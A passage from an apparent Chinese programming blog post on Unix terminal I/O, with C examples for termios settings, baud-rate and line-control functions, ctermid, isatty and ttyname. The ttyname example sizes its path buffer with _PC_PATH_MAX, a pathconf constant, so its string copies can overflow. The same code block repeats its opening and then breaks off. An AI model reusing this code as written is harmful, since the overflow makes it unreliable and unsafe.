class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcgetattr error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">switch</span> (term.c_cflag &amp; CSIZE) &#123;<br>        <span class="hljs-keyword">case</span> CS5:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5 bits/byte\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CS6:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;6 bits/byte\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CS7:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7 bits/byte\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CS8:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8 bits/byte\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknown bits/byte\n&quot;</span>);<br>    &#125;<br><br>    term.c_cflag &amp;= ~CSIZE; <span class="hljs-comment">//将CSIZE标志位取消</span><br>    term.c_cflag |= CS8; <span class="hljs-comment">//标记上CS8</span><br>    <span class="hljs-keyword">if</span> (tcsetattr(STDIN_FILENO, TCSANOW, &amp;term) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//设置属性,TCSANOW表示修改立即生效</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcsetattr error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="stty命令"><a href="#stty命令" class="headerlink" title="stty命令"></a>stty命令</h2><p>在程序中使用<code>tcgetattr</code>和<code>tcsetattr</code>函数进行检查和更改。在命令行中用<code>stty</code>命令进行检查和更改。</p><h2 id="波特率函数"><a href="#波特率函数" class="headerlink" title="波特率函数"></a>波特率函数</h2><p>波特率表示为位&#x2F;秒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><br><span class="hljs-type">speed_t</span> <span class="hljs-title function_">cfgetispeed</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *temptr)</span>;<br><span class="hljs-type">speed_t</span> <span class="hljs-title function_">cfgetospeed</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *termptr)</span>;<br><span class="hljs-comment">//两个函数的返回值：波特率值</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cfsetispeed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> termios *termptr, <span class="hljs-type">speed_t</span> speed)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">cfsetospeed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> termios *termptr <span class="hljs-type">speed_t</span> speed)</span>;<br><span class="hljs-comment">//两个函数的返回值：若成功，返回0；出错，返回-1</span><br></code></pre></td></tr></table></figure><h2 id="行控制函数"><a href="#行控制函数" class="headerlink" title="行控制函数"></a>行控制函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">tcdrain</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">tcflow</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> action)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">tcflush</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> <span class="hljs-built_in">queue</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">tcsendbreak</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> duration)</span>;<br><br><span class="hljs-comment">//4个函数的返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>tcdrain</code>函数等待所有输出都被传递</li><li><code>tcflow</code>函数用于对输入和输出流控制进行控制，<code>action</code>参数<ul><li><code>TCOOFF</code>：输出被挂起</li><li><code>TCOON</code>：重新启动以前被挂起的输出。</li><li><code>TCIOFF</code>：系统发送一个<code>STOP</code>字符，这将使终端设备停止发送数据。</li><li><code>TCION</code>：系统发送一个<code>START</code>字符，这将使终端设备恢复发送数据</li></ul></li><li><code>tcflush</code>函数冲洗输入缓冲区或输出缓冲区。<code>queue</code>参数必定是下列3个常量之一<ul><li><code>TCIFLUSH</code>冲洗输入队列</li><li><code>TCOFLUSH</code>冲洗输出队列</li><li><code>TCIOFLUSH</code>冲洗输入队列和输出队列</li></ul></li><li><code>tcsendbreak</code>函数在一个指定的时间区间内发送连续的0值位流。若<code>duration</code>参数为0，则此种传递延续0.25~0.5。<code>POSIX.1</code>说明若<code>duration</code>非0，则传递时间依赖于实现。</li></ul><h2 id="终端标识"><a href="#终端标识" class="headerlink" title="终端标识"></a>终端标识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">ctermid</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回指向控制终端名的指针；若出错，返回指向空字符串的指针</span><br></code></pre></td></tr></table></figure><p><strong>ctermid函数的实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> ctermid_name[L_ctermid];<br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">ctermid</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">NULL</span>)<br>        str = ctermid_name;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-built_in">strcpy</span>(str, <span class="hljs-string">&quot;/dev/tty&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>若文件描述符引用一个终端设备则<code>isatty</code>返回真。<code>ttyname</code>返回的是在该文件描述符上打开的终端设备的路径名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isatty</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-comment">//返回值：若为终端设备，返回1（真）；否则，返回0（假）</span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">ttyname</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-comment">//返回值：指向终端路径名的指针；若出错，返回NULL</span><br></code></pre></td></tr></table></figure><p><strong>isatty函数的实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">isatty</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">ts</span>;</span><br><br>    <span class="hljs-keyword">return</span>(tcgetattr(fd, &amp;ts) != <span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 0: %s\n&quot;</span>, isatty(<span class="hljs-number">0</span>) ? <span class="hljs-string">&quot;tty&quot;</span> : <span class="hljs-string">&quot;not a tty&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 1: %s\n&quot;</span>, isatty(<span class="hljs-number">1</span>) ? <span class="hljs-string">&quot;tty&quot;</span> : <span class="hljs-string">&quot;not a tty&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 2: %s\n&quot;</span>, isatty(<span class="hljs-number">2</span>) ? <span class="hljs-string">&quot;tty&quot;</span> : <span class="hljs-string">&quot;not a tty&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ttyname函数的实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">d_next</span>;</span><br>    <span class="hljs-type">char</span> *d_name;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">head</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">tail</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> pathname[_PC_PATH_MAX + <span class="hljs-number">1</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">char</span> *dirname)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>;</span><br>    <span class="hljs-type">int</span> len;<br><br>    len = <span class="hljs-built_in">strlen</span>(dirname); <span class="hljs-comment">//判断目录名长度</span><br><br>    <span class="hljs-keyword">if</span> ((dirname[len - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; (dirname[len - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;/&#x27;</span> ||<br>    (dirname[len - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; dirname[len<span class="hljs-number">-3</span>] == <span class="hljs-string">&#x27;/&#x27;</span>))) <br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(dirname, <span class="hljs-string">&quot;/dev/fd&quot;</span>) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ((ddp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> devdir))) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ((ddp-&gt;d_name = strdup(dirname)) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">free</span>(ddp);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ddp-&gt;d_next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (tail == <span class="hljs-literal">NULL</span>) &#123;<br>        head = ddp;<br>        tail = ddp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        tail-&gt;d_next = ddp;<br>        tail = ddp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>, *<span class="hljs-title">nddp</span>;</span><br>    ddp = head;<br>    <span class="hljs-keyword">while</span> (ddp != <span class="hljs-literal">NULL</span>) &#123;<br>        nddp = ddp-&gt;d_next;<br>        <span class="hljs-built_in">free</span>(ddp-&gt;d_name);<br>        <span class="hljs-built_in">free</span>(ddp);<br>        ddp = nddp;<br>    &#125;<br>    head = <span class="hljs-literal">NULL</span>;<br>    tail = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<br><span class="hljs-title function_">searchidr</span><span class="hljs-params">(<span class="hljs-type">char</span> *dirname, <span class="hljs-keyword">struct</span> stat *fdstatp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">devstat</span>;</span><br>    DIR *dp;<br>    <span class="hljs-type">int</span> devlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">dirp</span>;</span><br><br>    <span class="hljs-built_in">strcpy</span>(pathname, dirname);<br>    <span class="hljs-keyword">if</span> ((dp = opendir(dirname)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//打开指定的目录</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">strcat</span>(pathname, <span class="hljs-string">&quot;/&quot;</span>); <br>    devlen = <span class="hljs-built_in">strlen</span>(pathname);<br>    <span class="hljs-keyword">while</span> ((dirp = readdir(dp)) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strcpy</span>(pathname + devlen, dirp-&gt;d_name);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stdin&quot;</span>) == <span class="hljs-number">0</span> ||<br>        <span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stdout&quot;</span>) == <span class="hljs-number">0</span> ||<br>        <span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stderr&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//跳过终端</span><br>        <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (stat(pathname, &amp;devstat) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (S_ISDIR(devstat.st_mode)) &#123; <span class="hljs-comment">//判断是否为目录</span><br>            add(pathname); <span class="hljs-comment">//增加目录项</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (devstat.st_ino == fdstatp-&gt;st_ino &amp;&amp;<br>        devstat.st_dev == fdstatp-&gt;st_dev) &#123; <span class="hljs-comment">//找到对应目录项</span><br>            closedir(dp);<br>            <span class="hljs-keyword">return</span>(pathname);<br>        &#125;<br>    &#125;<br><br>    closedir(dp);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">ttyname</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">fdstat</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>;</span><br>    <span class="hljs-type">char</span> *rval;<br><br>    <span class="hljs-keyword">if</span> (isatty(fd) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;fdstat) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (S_ISCHR(fdstat.st_mode) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <br>    rval = searchidr(<span class="hljs-string">&quot;/dev&quot;</span>, &amp;fdstat); <span class="hljs-comment">//搜索/dev下的目录判断是否符合</span><br>    <span class="hljs-keyword">if</span> (rval == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">for</span> (ddp = head; ddp != <span class="hljs-literal">NULL</span>; ddp = ddp-&gt;d_next)<br>            <span class="hljs-keyword">if</span> ((rval = searchidr(ddp-&gt;d_name, &amp;fdstat)) != <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cleanup();<br>    <span class="hljs-keyword">return</span>(rval);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">0</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 0: %s\n&quot;</span>, name);<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">1</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 1: %s\n&quot;</span>, name);<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 2: %s\n&quot;</span>, name);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">d_next</span>;</span><br>    <span class="hljs-type">char</span> *d_name;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">head</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> 